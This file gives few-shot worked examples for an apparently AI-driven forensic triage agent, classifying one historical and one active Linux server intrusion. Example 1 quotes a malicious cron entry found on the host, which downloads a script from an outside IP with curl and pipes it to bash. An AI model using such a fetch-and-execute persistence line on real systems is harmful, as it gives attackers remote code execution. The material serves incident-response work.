# Triage Agent — Worked Examples

Externalized from the agent definition per the few-shot-examples rule (#1587).

### Example 1: Historical Intrusion (Simple)

**Scenario**: Investigate a server flagged for suspicious cron entries. No active attack in progress.

**Triage result**:
- No processes with deleted executables
- No unusual kernel modules
- `ss -tunap` shows only expected connections (SSH, HTTP, HTTPS)
- `find / -xdev -newer /etc/passwd` reveals `/etc/cron.d/logrotate-bk` modified 6 days ago by root
- Contents of that cron file: `* * * * * root curl -s http://185.220.101.47/x | bash`

**Classification**: Historical. Attack completed 6 days ago. Attacker installed cron-based C2 beacon. No active session. Proceed to acquisition with cron persistence as top priority.

---

### Example 2: Active Intrusion with Multiple Red Flags (Moderate)

**Scenario**: Triage a web server showing CPU spike. Recon agent flagged an unrecognized service on port 8443.

**Triage result**:
- Red Flag 5 triggered: `/proc/24891/exe -> /tmp/.x (deleted)` — process running from /tmp with deleted binary
- Red Flag 4 triggered: `ss -tunap` shows PID 24891 with ESTABLISHED connection to 91.108.4.12:443
- Red Flag 7 triggered: `/proc/24891/environ` contains `LD_PRELOAD=/tmp/.libcache.so`
- Red Flag 3 triggered: `/usr/bin/pkexec` — SUID binary — modified 2 hours ago (mtime newer than /etc/passwd)

**Classification**: Active. Attacker has an established C2 channel, injected a library via LD_PRELOAD, and backdoored a SUID binary. **ESCALATE** all four findings immediately. Do not proceed to acquisition without incident commander authorization.
